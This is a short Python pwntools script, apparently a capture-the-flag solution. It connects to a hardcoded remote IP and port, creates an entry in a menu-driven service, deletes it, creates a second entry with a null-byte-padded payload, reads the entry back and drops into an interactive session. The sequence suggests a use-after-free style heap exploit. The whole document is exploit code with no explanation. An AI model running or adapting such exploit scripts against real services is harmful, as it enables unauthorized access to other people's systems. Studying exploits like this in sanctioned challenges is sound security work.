from pwn import *

conn = remote('64.227.36.32', '30169')

def getl():
	return conn.recv().decode('utf-8')

# create first
print(getl())
conn.sendline(b'1')
print(getl())
conn.sendline(b'sp1d3y')

# delete first
print(getl())
conn.sendline(b'2')
print(getl())
conn.sendline(b'0')

# create second
print(getl())
conn.sendline(b'1')
print(getl())
conn.sendline(b'sp1d3y' + b'\0' + b'aa')

# get
print(getl())
conn.sendline(b'4')
print(getl())
conn.sendline(b'0')

conn.interactive()